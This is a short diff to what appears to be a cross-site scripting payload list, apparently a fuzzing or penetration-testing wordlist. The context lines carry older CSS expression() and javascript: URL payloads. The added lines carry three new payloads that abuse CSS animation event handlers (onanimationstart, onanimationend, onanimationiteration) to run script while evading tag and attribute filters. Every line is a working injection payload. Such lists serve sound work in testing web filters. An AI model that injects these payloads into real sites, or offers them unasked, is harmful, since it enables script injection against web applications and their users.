@@ -21,3 +21,6 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
 <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”> 
 <DIV STYLE=”width: expression(alert(‘XSS’));”>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
